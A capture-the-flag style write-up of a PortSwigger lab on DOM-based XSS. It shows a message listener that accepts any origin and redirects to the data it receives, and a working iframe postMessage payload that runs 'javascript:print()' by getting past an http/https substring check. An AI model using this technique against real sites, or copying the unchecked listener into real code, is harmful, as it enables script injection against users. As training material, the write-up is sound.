# DOM XSS using web messages and a JavaScript URL

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url), you'll learn: DOM XSS using web messages and a JavaScript URL! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-2/images/Pasted%20image%2020230114165638.png)

**View source page:**
```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

In this web message, it's vulnerable to DOM-based XSS, as **it doesn't verify the origin of incoming messages correctly** in the event listener, properties and functions that are called by the event listener.

Also, we can see a sink (Dangerous function): **`location.href`. It allows us to redirect to a page.**

But before it do that, **it checks the message data contains `http:` or `https:`.**

Armed with above information, we can host a malicious HTML file that contains `<iframe>` element and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page:

```html
<html>
    <head>
        <title>DOM XSS using web messages and a JavaScript URL</title>
    </head>
    <body>
        <iframe src="https://0afe0030035eec8ac08d954300cc0015.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*');"></iframe>
    </body>
</html>
```

As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into the `location.href` sink.

The `postMessage()` method payload is to set the `location.href` sink to `javascript:print()`, and the `//` is to comment out the rest of the JavaScript code. Then, the `https:` is to pass the `indexOf()` check.

Let's host it on the exploit server, and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-2/images/Pasted%20image%2020230114171327.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-2/images/Pasted%20image%2020230114171335.png)

It worked! Let's deliver it to victim:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-2/images/Pasted%20image%2020230114171400.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-2/images/Pasted%20image%2020230114171404.png)

# What we've learned:

1. DOM XSS using web messages and a JavaScript URL